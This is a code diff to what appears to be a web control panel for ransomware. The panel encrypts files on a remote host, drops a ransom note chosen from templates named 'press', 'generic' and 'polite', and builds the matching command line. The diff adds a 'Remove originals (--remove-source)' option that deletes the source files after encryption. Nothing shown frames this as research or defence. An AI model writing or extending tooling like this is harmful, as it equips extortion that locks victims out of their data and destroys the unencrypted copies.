@@ -197,6 +197,7 @@ tr:hover td{background:rgba(255,59,79,.065)}
           <label><input type="checkbox" id="rhDrop"> Drop ransom note (--drop-note)</label>
           <label><input type="checkbox" id="rhLocalIn"> Input is local (--local-in)</label>
           <label><input type="checkbox" id="rhLocalOut"> Output is local (--local-out)</label>
+          <label><input type="checkbox" id="rhRemoveSrc"> Remove originals (--remove-source)</label>
         </div>
         <div class="row">
           <div class="field"><label>Note template</label><select id="rhNoteTmpl"><option>press</option><option>generic</option><option>polite</option></select></div>
@@ -315,13 +316,15 @@ async function runRemote(){
     noteTmpl:document.getElementById('rhNoteTmpl').value,
     notePath:document.getElementById('rhNotePath').value,
     localIn:document.getElementById('rhLocalIn').checked,
-    localOut:document.getElementById('rhLocalOut').checked
+    localOut:document.getElementById('rhLocalOut').checked,
+    removeSrc:document.getElementById('rhRemoveSrc').checked
   };
   const encrypt = body.dir.startsWith('encrypt');
   let cmd='key fe '+(encrypt?'-e ':'-d ')+'--host '+shellQuote(body.host)+' -i '+shellQuote(body.input)+' -o '+shellQuote(body.output)+' -k '+shellQuote(body.password)+' --timeout '+body.timeout;
   if(body.localIn){cmd+=' --local-in';}
   if(body.localOut){cmd+=' --local-out';}
   if(body.drop){cmd+=' --drop-note '+body.noteTmpl+' --note-out '+shellQuote(body.notePath);}
+  if(body.removeSrc&&encrypt){cmd+=' --remove-source';}
   show('rhCmd',escapeHtml(cmd));
   const r=await postJson('/run/remote',body);
   let out=escapeHtml(r.output||r.error||'');
